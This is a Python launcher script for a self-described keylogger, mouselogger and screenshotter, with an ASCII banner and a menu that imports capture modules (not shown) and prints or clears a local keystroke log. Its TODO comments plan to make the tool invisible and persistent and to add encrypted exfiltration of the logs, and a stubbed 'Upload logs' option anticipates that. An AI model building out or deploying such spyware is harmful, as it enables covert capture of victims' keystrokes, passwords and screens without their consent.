import threading

print("""
              ;xkdddxkk0KKOl.
             ;KMMMMMMMMMMMMW0;
            ,0MMMMMMMMMMMMMMMXc
           .xWMMMMMMMMMMMMMMMMK;
       ..';dNMMMMMMMMMMMMMMMMMMk.
 .';coxOKXWWMMMMMMMMMMMMMMMMMMMNo.
 .,;;;::ckNMMMMMMMMMMMMMNKKXNMMMNx;.
      ,oxKWMMMMMMMMMMMMWO:,';xXNKKKOo,.
      .lKWMMMMMMMMMMMMMMWN0d;,xXc..;clc,.
        ,kWMMMMMMMMMMMMMMMMMWXNW0l:.   ..
         .dNMMMMMMMMMMMMMMMMMMMMMWx.
          cXMMMMMMMMWNX0KXWWMMMMWk.
        .dNMMMMMMMMMWWNKkl:cdOXWK;
       ;OWMMMMMMMMMMMMMMWKd:...:;.
      :XMMMMMMMMMMMMMMMMMMMW0l'.
      '0MMMMMMMMMMMMMMMMMMMMMWKx:.
      'OMMMMMMMMMMMMMMMMMMMMMMMWXx'
      lNMMMMMMMMMMMMMMMMMMMMMMMMWNk'
_________________________________________
 Keylogger/Mouselogger/Screenshotter v.1
         www.github.com/gitgiant
        Please don't use for evil
""")
# TODO: implement threading, make invisible, implement verbose/mousehook logging, capture png instead of bitmap
# TODO: set up exfiltration of logs (encrpyt?), track present window, caps and caps lock, fix backspace, persistent
if __name__ == '__main__':
    while True:
        print("Please select from the following options:")
        print("[K]eylogger.")
        print("[M]ouselogger.")
        print("[S]creenshotter.")
        print("[O]ptions.")
        print("[E]xit the program.")
        choice = input('[>]').lower()
        if choice == 'k':
            import keyboardhook
        elif choice == 'm':
            import mousehook
        elif choice == 's':
            import screenshotter
        elif choice == 'o':
            print("[P]rint captured keylog.")
            print("[C]lear logs.")
            print("[U]pload logs.")
            print("[R]eturn to Main Menu.")
            choice = input('[>]').lower()
            if choice == 'p':
                f = open('log_file.txt', 'r')
                for line in f:
                    print(line)
            elif choice == 'c':
                open('log_file.txt', 'w').close()
            elif choice == 'u':
                pass
            elif choice == 'r':
                continue
            else:
                print("Incorrect input")
        elif choice == 'e':
            print("Exiting...")
            exit(0)
        else:
            print("Incorrect input.")
